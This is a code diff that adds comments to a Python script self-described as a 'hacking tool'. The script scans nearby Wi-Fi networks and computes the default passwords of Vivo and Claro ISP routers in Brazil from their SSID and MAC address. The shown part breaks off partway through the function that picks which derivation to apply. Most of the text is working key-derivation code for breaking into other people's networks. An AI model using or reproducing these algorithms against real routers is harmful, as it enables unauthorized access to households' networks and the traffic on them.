@@ -1,12 +1,16 @@
+"""
+Hacking tool that gets default passwords for brazilian IPS
+"""
 import argparse
 import socket
 import wifi
 
 
+"""
+Return a list with ssid and mac addresses
+"""
 def get_wifi_info(interface) -> list:
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        # sockfd = sock.fileno()
         iw_cells = wifi.Cell.all(interface)
         wifi_info = [(cell.ssid, cell.address) for cell in iw_cells]
         return wifi_info
@@ -16,24 +20,39 @@ def get_wifi_info(interface) -> list:
         print(f"An error occurred: {e}")
 
 
+"""
+Check if the ssid contains the default name pattern
+"""
 def is_vuln(ssid: str) -> bool:
     if 'VIVOFIBRA-' in ssid or 'CLARO' in ssid or 'VIVO-' in ssid:
         return True
     return False
 
 
+"""
+Own vivo fibra default password
+"""
 def own_vivofibra(ssid: str,mac:str) -> str:
     return mac.replace(":","").lower()[2:8] + ssid.split("-")[1].lower()
 
 
+"""
+Own vivo default password
+"""
 def own_vivo(mac: str) -> str:
     return mac.replace(":","").upper()[2:]
 
 
+"""
+Own claro default password
+"""
 def own_claro(mac: str) -> str:
     return mac.replace(":","").upper()[4:]
 
 
+"""
+Function that check which own algorithm to use
+"""
 def wifi_owner(wifi_list: list):
     if wifi_list:
         print("Available WiFi Information:")
